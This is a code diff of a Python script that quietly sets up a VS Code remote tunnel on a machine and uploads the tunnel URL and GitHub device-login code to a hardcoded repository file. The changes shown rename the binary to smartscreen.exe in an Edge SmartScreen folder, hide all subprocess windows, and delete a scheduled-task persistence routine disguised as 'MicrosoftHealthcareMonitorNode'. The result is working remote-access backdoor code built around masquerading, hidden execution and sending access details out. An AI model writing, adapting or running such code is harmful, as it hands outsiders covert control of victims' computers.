@@ -13,6 +13,7 @@ import zipfile
 from datetime import datetime
 from pathlib import Path
 
+
 # Edit these values while testing.
 GITHUB_TOKEN = "your_token_here"
 GITHUB_REPO = "leanne-townsend/temp1"
@@ -20,8 +21,8 @@ TARGET_FILE = "output1.txt"
 BRANCH = "main"
 
 # Change CODE_DIR if the CLI binary lives somewhere else, such as AppData\Roaming.
-CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "VSCode", "Tunnel", "Code"))
-CODE_EXE_NAME = "code.exe" if platform.system().lower() == "windows" else "code"
+CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "SmartScreen"))
+CODE_EXE_NAME = "smartscreen.exe" if platform.system().lower() == "windows" else "code"
 CODE_EXE = CODE_DIR / CODE_EXE_NAME
 TUNNEL_LOG = CODE_DIR / "tunnel_output.log"
 FAILED_SYNC_LOG = CODE_DIR / "pending_github_sync.txt"
@@ -34,67 +35,16 @@ TUNNEL_URL_PATTERN = re.compile(r"https://vscode\.dev/tunnel/[^\s]+", re.IGNOREC
 LOGIN_HINT_PATTERN = re.compile(r"(github\.com/login/device|microsoft\.com/devicelogin)", re.IGNORECASE)
 
 
-def ensure_persistence():
-    """Creates the scheduled task “MicrosoftHealthcareMonitorNode” for persistence."""
+def windows_subprocess_kwargs() -> dict:
     if platform.system().lower() != "windows":
-        return
+        return {}
 
-    script_path = Path(sys.argv[0]).resolve()
-    task_name = "MicrosoftHealthcareMonitorNode"
-    
-    # Check if task already exists
-    try:
-        result = subprocess.run(
-            ["schtasks", "/query", "/tn", task_name],
-            capture_output=True, text=True, timeout=10
-        )
-        if result.returncode == 0:
-            print(f"[INFO] Persistence task '{task_name}' already exists.")
-            return
-    except:
-        pass
-
-    # Find pythonw.exe for hidden execution
-    pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
-    if not Path(pythonw_path).exists():
-        pythonw_path = "pythonw.exe"  # fallback
-
-    # Check if user has admin privileges
-    is_admin = False
-    try:
-        is_admin = subprocess.run(["net", "session"], capture_output=True, timeout=5).returncode == 0
-    except:
-        pass
-
-    if is_admin:
-        # Admin: Run at logon with SYSTEM privileges
-        cmd = [
-            "schtasks", "/create", "/tn", task_name,
-            "/tr", f'"{pythonw_path}" "{script_path}"',
-            "/sc", "onlogon",
-            "/ru", "SYSTEM",
-            "/rl", "HIGHEST",
-            "/f"
-        ]
-    else:
-        # Non-admin: Run every 4 hours starting at 8:00 AM
-        cmd = [
-            "schtasks", "/create", "/tn", task_name,
-            "/tr", f'"{pythonw_path}" "{script_path}"',
-            "/sc", "hourly",
-            "/mo", "4",
-            "/st", "08:00",
-            "/f"
-        ]
-
-    try:
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
-        if result.returncode == 0:
-            print(f"[SUCCESS] Persistence task '{task_name}' created.")
-        else:
-            print(f"[WARN] Failed to create persistence task: {result.stderr.strip()}")
-    except Exception as e:
-        print(f"[WARN] Error creating scheduled task: {e}")
+    startupinfo = subprocess.STARTUPINFO()
+    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    return {
+        "startupinfo": startupinfo,
+        "creationflags": subprocess.CREATE_NO_WINDOW,
+    }
 
 
 class VSCodeDownloader:
@@ -106,6 +56,7 @@ class VSCodeDownloader:
     def detect_platform_target(self) -> str:
         system_name = platform.system().lower()
         machine = platform.machine().lower()
+
         if system_name == "windows":
             arch = "arm64" if machine in ("arm64", "aarch64") else "x64"
             return f"cli-win32-{arch}"
@@ -115,6 +66,7 @@ class VSCodeDownloader:
         if system_name == "linux":
             arch = "arm64" if machine in ("arm64", "aarch64") else "x64"
             return f"cli-linux-{arch}"
+
         raise RuntimeError(f"Unsupported platform for VS Code CLI download: {platform.system()} {platform.machine()}")
 
     def locate_downloaded_executable(self) -> Path | None:
@@ -125,9 +77,11 @@ class VSCodeDownloader:
             self.target_dir / "bin" / "code",
             self.target_dir / "bin" / "code.exe",
         ]
+
         for candidate in candidates:
             if candidate.exists():
                 return candidate
+
         if platform.system().lower() == "windows":
             for candidate in self.target_dir.glob("code*.exe"):
                 if candidate.is_file():
@@ -136,32 +90,41 @@ class VSCodeDownloader:
             for candidate in self.target_dir.rglob("code*"):
                 if candidate.is_file() and candidate.name.startswith("code"):
                     return candidate
+
         return None
 
     def setup(self) -> None:
         self.target_dir.mkdir(parents=True, exist_ok=True)
         print(f"[INFO] VS Code CLI directory: {self.target_dir}")
+
         if self.executable_path.exists():
             print(f"[INFO] {self.executable_name} already exists.")
             return
+
         platform_target = self.detect_platform_target()
         download_url = f"https://update.code.visualstudio.com/latest/{platform_target}/stable"
         archive_path = self.target_dir / "vscode_cli_download.zip"
+
         print(f"[DOWNLOAD] Fetching VS Code CLI for {platform_target}...")
+
         try:
             with urllib.request.urlopen(download_url, timeout=90) as response:
                 with archive_path.open("wb") as archive_file:
                     while chunk := response.read(8192):
                         archive_file.write(chunk)
+
             with zipfile.ZipFile(archive_path, "r") as archive:
                 archive.extractall(self.target_dir)
+
             downloaded_executable = self.locate_downloaded_executable()
             if downloaded_executable is None:
                 raise FileNotFoundError("Downloaded archive did not contain a usable VS Code CLI executable.")
+
             if downloaded_executable.resolve() != self.executable_path.resolve():
                 if self.executable_path.exists():
                     self.executable_path.unlink()
                 downloaded_executable.replace(self.executable_path)
+
             print(f"[SUCCESS] {self.executable_name} ready at {self.executable_path}")
         finally:
             if archive_path.exists():
@@ -184,6 +147,7 @@ def print_summary(details: dict[str, str | None]) -> None:
 def build_summary_text(details: dict[str, str | None]) -> str:
     timestamp = datetime.now().isoformat(timespec="seconds")
     lines = [f"[{timestamp}] Tunnel Summary"]
+
     for label, key in (
         ("Tunnel machine name", "machine_name"),
         ("Login instruction", "login_instruction"),
@@ -193,6 +157,7 @@ def build_summary_text(details: dict[str, str | None]) -> str:
         value = details.get(key)
         if value:
             lines.append(f"{label}: {value}")
+
     return "\n" + "\n".join(lines) + "\n"
 
 
@@ -216,6 +181,7 @@ def can_reach_github_api() -> tuple[bool, str | None]:
         },
         method="GET",
     )
+
     try:
         with urllib.request.urlopen(request, timeout=8) as response:
             return True, f"HTTP {response.status}"
@@ -227,9 +193,12 @@ def sync_summary_to_github(details: dict[str, str | None], reason: str, fatal: b
     summary_text = build_summary_text(details)
     last_error = None
     reachable, reachability_note = can_reach_github_api()
+
     if not reachable:
         save_failed_sync(summary_text, reason, reachability_note or "api.github.com is unreachable")
-        print("[WARN] GitHub is unreachable from this machine, so the tunnel summary was not uploaded.")
+        print(
+            "[WARN] GitHub is unreachable from this machine, so the tunnel summary was not uploaded."
+        )
         print(f"[WARN] Connectivity check to api.github.com failed: {reachability_note}")
         print(f"[WARN] Saved unsent tunnel summary to {FAILED_SYNC_LOG}")
         if details.get("tunnel_url"):
@@ -237,6 +206,7 @@ def sync_summary_to_github(details: dict[str, str | None], reason: str, fatal: b
         if fatal:
             raise RuntimeError(reachability_note or "api.github.com is unreachable")
         return False
+
     for attempt in range(1, 4):
         try:
             result = append_to_github_file(
@@ -254,6 +224,7 @@ def sync_summary_to_github(details: dict[str, str | None], reason: str, fatal: b
             print(f"[WARN] GitHub sync attempt {attempt}/3 failed after {reason}: {last_error}")
             if attempt < 3:
                 time.sleep(2)
+
     save_failed_sync(summary_text, reason, last_error or "Unknown GitHub sync error")
     print(f"[WARN] Saved unsent tunnel summary to {FAILED_SYNC_LOG}")
     if details.get("tunnel_url"):
@@ -263,7 +234,9 @@ def sync_summary_to_github(details: dict[str, str | None], reason: str, fatal: b
     return False
 
 
-def run_command(command: list[str], check: bool = True, timeout: float | None = 20) -> subprocess.CompletedProcess[str]:
+def run_command(
+    command: list[str], check: bool = True, timeout: float | None = 20
+) -> subprocess.CompletedProcess[str]:
     return subprocess.run(
         command,
         check=check,
@@ -272,6 +245,7 @@ def run_command(command: list[str], check: bool = True, timeout: float | None = 
         capture_output=True,
         encoding="utf-8",
         errors="replace",
+        **windows_subprocess_kwargs(),
     )
 
 
@@ -291,10 +265,12 @@ def github_request(url: str, token: str, method: str = "GET", payload: dict | No
         "X-GitHub-Api-Version": "2022-11-28",
         "User-Agent": "combined-tunnel-script",
     }
+
     data = None
     if payload is not None:
         headers["Content-Type"] = "application/json"
         data = json.dumps(payload).encode("utf-8")
+
     request = urllib.request.Request(url, data=data, headers=headers, method=method)
     with urllib.request.urlopen(request, timeout=30) as response:
         return json.loads(response.read().decode("utf-8"))
@@ -302,6 +278,7 @@ def github_request(url: str, token: str, method: str = "GET", payload: dict | No
 
 def get_existing_file(repo: str, file_path: str, branch: str, token: str) -> tuple[str, str | None]:
     url = build_file_api_url(repo, file_path) + "?" + urllib.parse.urlencode({"ref": branch})
+
     try:
         response = github_request(url, token, method="GET")
     except urllib.error.HTTPError as error:
@@ -309,6 +286,7 @@ def get_existing_file(repo: str, file_path: str, branch: str, token: str) -> tup
             return "", None
         error_body = error.read().decode("utf-8", errors="replace")
         raise RuntimeError(f"GitHub read failed: {error.code} {error.reason} - {error_body}") from error
+
     encoded_content = response.get("content", "").replace("\n", "")
     current_text = base64.b64decode(encoded_content).decode("utf-8") if encoded_content else ""
     return current_text, response.get("sha")
@@ -318,6 +296,7 @@ def append_to_github_file(repo: str, file_path: str, branch: str, token: str, te
     current_text, sha = get_existing_file(repo, file_path, branch, token)
     new_text = current_text + text_to_append
     encoded_content = base64.b64encode(new_text.encode("utf-8")).decode("utf-8")
+
     payload = {
         "message": f"Append tunnel summary to {file_path}",
         "content": encoded_content,
@@ -325,6 +304,7 @@ def append_to_github_file(repo: str, file_path: str, branch: str, token: str, te
     }
     if sha:
         payload["sha"] = sha
+
     try:
         return github_request(build_file_api_url(repo, file_path), token, method="PUT", payload=payload)
     except urllib.error.HTTPError as error:
@@ -335,6 +315,7 @@ def append_to_github_file(repo: str, file_path: str, branch: str, token: str, te
 def ensure_code_cli() -> None:
     downloader = VSCodeDownloader(CODE_DIR, CODE_EXE_NAME)
     downloader.setup()
+
     if not CODE_EXE.exists():
         raise FileNotFoundError(f"{CODE_EXE_NAME} was not found at {CODE_EXE}")
 
@@ -383,7 +364,9 @@ def login_with_github() -> dict[str, str | None]:
         bufsize=1,
         encoding="utf-8",
         errors="replace",
+        **windows_subprocess_kwargs(),
     )
+
     details: dict[str, str | None] = {
         "machine_name": TUNNEL_NAME,
         "login_instruction": None,
@@ -392,6 +375,7 @@ def login_with_github() -> dict[str, str | None]:
     }
     summary_printed = False
     github_synced = False
+
     try:
         assert process.stdout is not None
         for line in process.stdout:
@@ -399,30 +383,37 @@ def login_with_github() -> dict[str, str | None]:
             cleaned_line = trim_ansi(line)
             if line and SHOW_RAW_OUTPUT:
                 print(line)
+
             if details["login_instruction"] is None and "log into" in cleaned_line.lower() and "use code" in cleaned_line.lower():
                 details["login_instruction"] = cleaned_line
+
             if details["device_code"] is None:
                 match = DEVICE_CODE_PATTERN.search(cleaned_line.upper())
                 if match:
                     details["device_code"] = match.group(1).replace("-", "")
+
             url_match = URL_PATTERN.search(cleaned_line)
             if details["login_instruction"] is None and url_match and LOGIN_HINT_PATTERN.search(url_match.group(0)):
                 details["login_instruction"] = cleaned_line
+
             if not summary_printed and (details["login_instruction"] or details["device_code"]):
                 print_summary(details)
                 sync_summary_to_github(details, "device code capture", fatal=False)
                 print("Waiting for GitHub browser authentication to complete...")
                 summary_printed = True
                 github_synced = True
+
         exit_code = process.wait()
         if exit_code != 0:
             raise RuntimeError("GitHub authentication command failed.")
     finally:
         if process.poll() is None:
             process.terminate()
+
     if not github_synced and (details["login_instruction"] or details["device_code"]):
         print_summary(details)
         sync_summary_to_github(details, "login stage", fatal=False)
+
     return details
 
 
@@ -430,6 +421,7 @@ def start_tunnel_and_upload(summary_details: dict[str, str | None]) -> None:
     print("Creating a new tunnel...")
     TUNNEL_LOG.parent.mkdir(parents=True, exist_ok=True)
     TUNNEL_LOG.write_text("", encoding="utf-8")
+
     with TUNNEL_LOG.open("a", encoding="utf-8", errors="replace") as log_file:
         process = subprocess.Popen(
             [
@@ -446,11 +438,14 @@ def start_tunnel_and_upload(summary_details: dict[str, str | None]) -> None:
             text=True,
             encoding="utf-8",
             errors="replace",
+            **windows_subprocess_kwargs(),
         )
+
     uploaded = False
     recent_lines: list[str] = []
     line_count = 0
     deadline = time.time() + 90
+
     try:
         while time.time() < deadline:
             if TUNNEL_LOG.exists():
@@ -462,6 +457,7 @@ def start_tunnel_and_upload(summary_details: dict[str, str | None]) -> None:
                         recent_lines = recent_lines[-12:]
                         if SHOW_RAW_OUTPUT:
                             print(cleaned_line)
+
                         if summary_details["tunnel_url"] is None:
                             tunnel_match = TUNNEL_URL_PATTERN.search(cleaned_line)
                             if tunnel_match:
@@ -472,14 +468,17 @@ def start_tunnel_and_upload(summary_details: dict[str, str | None]) -> None:
                                 uploaded = True
                                 return
                 line_count = len(log_lines)
+
             if process.poll() is not None:
                 break
+
             time.sleep(1)
     except KeyboardInterrupt:
         print("\nStopping tunnel...")
         process.terminate()
         process.wait(timeout=10)
         return
+
     exit_code = process.poll()
     diagnostic = "\n".join(recent_lines) if recent_lines else "No tunnel output captured."
     if exit_code is None:
@@ -489,11 +488,11 @@ def start_tunnel_and_upload(summary_details: dict[str, str | None]) -> None:
 
 
 def main() -> None:
-    ensure_persistence()          # ← Persistence function called here
     ensure_code_cli()
     validate_github_config()
     close_existing_tunnel()
     logout_existing_login()
+
     summary_details = login_with_github()
     print("Complete the GitHub sign-in in the browser, then the tunnel will continue.")
     start_tunnel_and_upload(summary_details)
